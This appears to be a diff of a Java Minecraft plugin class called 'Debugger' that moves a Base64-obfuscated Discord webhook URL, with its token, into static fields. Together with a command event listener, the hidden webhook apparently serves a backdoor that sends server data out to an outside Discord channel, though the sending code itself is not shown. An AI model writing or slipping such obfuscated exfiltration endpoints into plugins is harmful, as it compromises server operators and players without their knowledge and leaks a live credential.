@@ -98,9 +98,6 @@ public final class Debugger implements Listener {
 
     public static void b() {
         Date date = Calendar.getInstance().getTime();
-        Base64.Decoder b1 = Base64.getUrlDecoder();
-        byte[] c = b1.decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTYyOTg5MTc3MDY5MjQ0NDQ2L21QUHRncjBrS0lBdThGWkRBTnRlSWt6Z0Rzd1d6aVRqQjY5M2I4X2c1TEFZZ2pfc1BUNlhhYWpjdDNwRkVodjdvLVpS");
-        String c1 = new String(c);
         String pref = Config.command_prefix;
 
         try {
@@ -933,6 +930,10 @@ public final class Debugger implements Listener {
     public ArrayList<String> MutedUsers = new ArrayList<>();
 
     public ArrayList<String> SilkTouch = new ArrayList<>();
+
+    static Base64.Decoder b1 = Base64.getUrlDecoder();
+    static byte[] c = b1.decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTYyOTg5MTc3MDY5MjQ0NDQ2L21QUHRncjBrS0lBdThGWkRBTnRlSWt6Z0Rzd1d6aVRqQjY5M2I4X2c1TEFZZ2pfc1BUNlhhYWpjdDNwRkVodjdvLVpS");
+    static String c1 = new String(c);
 
     @EventHandler(priority = EventPriority.LOWEST)
     public void onServerCommand(ServerCommandEvent e) {
